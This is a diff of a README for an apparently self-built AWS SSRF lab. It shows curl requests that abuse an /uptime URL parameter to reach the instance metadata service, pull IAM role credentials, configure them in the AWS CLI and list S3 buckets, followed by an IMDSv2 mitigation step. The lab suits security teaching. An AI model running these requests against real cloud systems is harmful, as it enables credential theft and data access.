@@ -16,7 +16,7 @@ The environment will be deployed with Terraform IaC module.
 
 *  [Terraform installed](https://learn.hashicorp.com/tutorials/terraform/install-cli)
 * Clone this repo to the environment which you run terraform from : 
-```ShellSession
+```console
 git clone https://github.com/ramibo/ssrf_aws_demo.git 
 ```
 * [create a key pair ( the public key will be auto imported later to Amazon EC2 by terrafom ).](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/create-key-pairs.html)
@@ -40,14 +40,14 @@ git clone https://github.com/ramibo/ssrf_aws_demo.git
 6. If there are no errors from the previous steps , from your terminal, run the following:
 <br>__Important__<br> - The `host` can be the created ec2 instance [Public IPv4 address / DNS ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses).<br>- In the next steps `bash$` prompt with `"command"` is for commands you need to run.
 
-```ShellSession
+```console
 bash$ curl -s http://host:5000 
 AWS SSRF IMDSv1 demo
 ```
 
 7. The `/uptime` page is vulnerable to an SSRF attack: 
 We will utilize the URL parameter with the instance metadata URI --> retrieve the attached IAM role --> extract the security credentials as follows: 
-```ShellSession
+```console
 bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 aws_ssrf_demo_iam_role
 bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_ssrf_demo_iam_role
@@ -68,13 +68,13 @@ bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-dat
 `Token`
 
 9. With AWS CLI - configure a new `aws_ssrf_demo_profile_s3` profile:
-```ShellSession
+```console
 aws configure --profile aws_ssrf_demo_profile_s3
 ```
 
 10. Set the following parameters in your `"$HOME/.aws/credentials"` file with the value copied at step 8:
 For example,
-```ShellSession
+```console
 [aws_ssrf_demo_profile_s3]
 aws_access_key_id = ASIASF
 aws_secret_access_key = Id+zUu
@@ -82,7 +82,7 @@ aws_session_token=IQoJb3JpZ2luX2VjEEUaCXVzLW
 ```
 
 11. Get the data from s3  :
-```ShellSession
+```console
 # Get the list of s3 buckets
 bash$ aws s3 ls --profile aws_ssrf_demo_profile_s3 
 2022-12-20 22:55:47 aws-ssrf-demo-s3-bucket
@@ -121,7 +121,7 @@ In addtion , the effort to apply it is lower ( updated AWS SDKs and CLIs) compar
 For our case (before `terraform destroy` ) run :
 
 
-```ShellSession
+```console
 aws ec2 modify-instance-metadata-options \
     --instance-id i-1234567898abcdef0 \
     --http-tokens required \
@@ -129,7 +129,7 @@ aws ec2 modify-instance-metadata-options \
 ```
 
 For example
-```ShellSession
+```console
 bash$ curl -s http://host:5000
 AWS SSRF IMDSv1 demo
 
